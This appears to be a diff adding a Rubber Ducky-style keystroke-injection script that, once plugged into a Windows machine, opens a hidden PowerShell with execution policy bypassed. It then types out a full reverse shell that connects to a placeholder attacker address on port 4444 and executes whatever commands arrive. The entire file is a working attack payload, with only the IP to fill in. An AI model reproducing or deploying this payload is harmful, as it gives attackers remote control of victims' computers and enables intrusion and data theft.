@@ -1,0 +1,50 @@
+REM ========================================
+REM Windows Reverse Shell Payload
+REM Replace ATTACKER_IP and PORT with your values
+REM ========================================
+
+REM Wait for target to be ready
+DELAY 2000
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Launch PowerShell hidden
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+
+REM Create reverse shell connection
+STRING $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444)
+ENTER
+DELAY 200
+STRING $stream = $client.GetStream()
+ENTER
+DELAY 200
+STRING [byte[]]$bytes = 0..65535|%{0}
+ENTER
+DELAY 200
+STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+ENTER
+DELAY 100
+STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+ENTER
+DELAY 100
+STRING $sendback = (iex $data 2>&1 | Out-String )
+ENTER
+DELAY 100
+STRING $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+ENTER
+DELAY 100
+STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+ENTER
+DELAY 100
+STRING $stream.Write($sendbyte,0,$sendbyte.Length)
+ENTER
+DELAY 100
+STRING $stream.Flush()}
+ENTER
+DELAY 100
+STRING $client.Close()
+ENTER
